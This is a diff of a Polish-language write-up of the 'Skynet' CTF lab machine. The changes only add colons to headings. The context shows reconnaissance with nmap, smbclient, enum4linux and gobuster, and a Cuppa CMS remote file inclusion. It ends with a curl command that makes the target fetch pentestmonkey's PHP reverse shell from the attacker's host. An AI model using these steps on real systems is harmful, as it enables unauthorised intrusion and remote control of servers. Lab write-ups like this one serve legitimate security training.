@@ -1,7 +1,7 @@
 # Skynet
 ![](/graphic/skynet_start.png)
 
-## Nmap
+## Nmap:
 Sprawdzam co mogę znaleść za pomocą narzędzia `nmap`.
 Nmap pokazuje mi otwarte porty i dostępne usługi.
 
@@ -267,7 +267,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 405.46 seconds
 ```
 Zaciekawiła mnie usługa `smb`, do której spróbowałem uzyskać dostęp bez hasła. Znalazłem tam plik `attention.txt` i katalog `logs`. W katalogu `logs` znalazłem plik `log1.txt`. Po pobraniu obu plików okazało się, że plik `lop1.txt` to słownik haseł a plik `attention.txt` zawiera wiadomość z podpisem `
-## SMBCLIENT /anonymous
+## SMBCLIENT /anonymous:
 ```
 ─$ smbclient //10.10.37.27/anonymous                                         
 Password for [WORKGROUP\kali]:
@@ -295,7 +295,7 @@ getting file \logs\log1.txt of size 471 as log1.txt (1.1 KiloBytes/sec) (average
 smb: \logs\> cd ..                                                              smb: \logs\> ^C
 ```
 
-## Zawartość pliku `log1.txt`
+## Zawartość pliku `log1.txt`:
 ```
 ─$ cat log1.txt     
 cyborg007haloterminator
@@ -365,7 +365,7 @@ Reconnecting with SMB1 for workgroup listing.
 Znów znajduję nazwę użytkownika Tym razem w części `Comment` widać imię i nazwisko `Miles Dyson`, prawdopodobnie jest to nazwa użytkownika.
 
 
-## lin4enum
+## lin4enum:
 ```
 $ enum4linux -a 10.10.37.27 2> Skyne_enum4linux.txt
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jun 29 04:36:19 2023
@@ -618,7 +618,7 @@ Po zalogowaniu na platformę widzę wiadomości e-mail. W jednej z nich znajduje
 
 ![](/graphic/skynet_squirrelmail_maile.bmp)
 ![](/graphic/skynet_squirrelmail_maile_has%C5%82o.bmp)
-## smbclient Miles Dyson
+## smbclient Miles Dyson:
 
 W udziale użytkownika `Miles Dyson` znajdują się pliki`.pdf` i katalog `note`. Po przejściu do tego katalogu widzę plik `important.txt`, który pobieram.
 
@@ -694,7 +694,7 @@ Plik `important.txt` zawiera opis kolejnej podstrony internetowej.
 
 ![](/graphic/skynet_strona_45kra24zxs28v3yd.bmp)
 
-## gobuster /45kra24zxs28v3yd 
+## gobuster /45kra24zxs28v3yd:
 
 Po znalezieniu kolejnej strony internetowej sprawdzam narzędziem `gobuster`, czy znajdują się tam kolejne podstrony. Sprawdzam, co mogę znaleść we wskazanej podstronie `administrator`.
 
@@ -704,7 +704,7 @@ Na odkrytej podstronie `/administrator` znajduje się formularz logowania do apl
 
 ![](/graphic/skynet_strona_45kra24zxs28v3yd_administrator.bmp)
 
-## searchsploit
+## searchsploit:
 
 Szukam podatności aplikacji `cuppa cms`. Po znalezieniu podatności kopiuję plik z opisem podatności do katalogu, w którym zbieram wszystkie informacje związane z tą maszyną.
 
@@ -832,7 +832,7 @@ Able to read sensitive information via File Inclusion (PHP Stream)
 Osoba atakująca może za pomocą tej luki dołączyć lokalne lub zdalne pliki PHP. Co oznacza, że możemy dołączyć [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Ta luka w zabezpieczeniach może doprowadzić do całkowitego naruszenia bezpieczeństwa serwera.
 
 
-## Odwrócowa powłoka
+## Odwrócowa powłoka:
 
 Pobieram plik z odwróconą powłoką poleceniem `wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php` do katalogu bieżącego i zgodnie z opisem podmieniam `ip` na ten maszyny atakującej i wybieram `port`, na którym będę nasłuchiwać. W bieżącym katalogu poleceniem `python3 -m http.server 9000` uruchamiam serwer `www` i w innej karcie konsoli uruchamiam nasłuchiwanie na wskazanym porcie. Poleceniem `curl http://10.10.197.235/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.78.81:9000/php-reverse-shell.php` wysyłam odwróconą powłokę.
 
